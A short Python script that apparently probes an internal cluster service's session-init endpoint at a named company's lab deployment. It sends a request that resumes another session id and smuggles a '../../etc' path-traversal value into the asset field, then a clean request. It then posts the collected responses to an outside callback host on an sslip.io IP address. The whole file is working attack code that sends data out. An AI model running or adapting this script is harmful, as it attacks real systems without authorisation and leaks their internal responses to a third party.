import http.client,json,time,urllib.request
D='lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
U='snapgpt-basic4-20261105-052555@armorerlabs.com'; OLD='10e0890a7d03'; HOST='https://snapgpt.labs.snaplogicdev.com'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'user':U,'old':OLD}
def post(path,obj,timeout):
 c=http.client.HTTPConnection(D,80,timeout=timeout); raw=json.dumps(obj,separators=(',',':')).encode(); c.request('POST',path,raw,{'Content-Type':'application/json','X-SL-Token':'x'}); r=c.getresponse(); return r.status,r.read().decode('utf-8','replace')
try:
 out['bad_init']=post('/session/init',{'user_id':U,'host_url':HOST,'project_path':'','project_id':'','force':False,'resume_session_id':OLD,'scoped_assets':[{'name':'bad','path':'../../etc','asset_type':'File'}]},30)
except Exception as e: out['bad_init_error']=repr(e)
time.sleep(.5)
try:
 out['clean_init']=post('/session/init',{'user_id':U,'host_url':HOST,'project_path':'','project_id':'','force':False},30)
except Exception as e: out['clean_init_error']=repr(e)
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-race4-cold4-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'});urllib.request.urlopen(q,timeout=20).read()
except Exception as e: out['sink_error']=repr(e)
print(json.dumps(out,sort_keys=True))
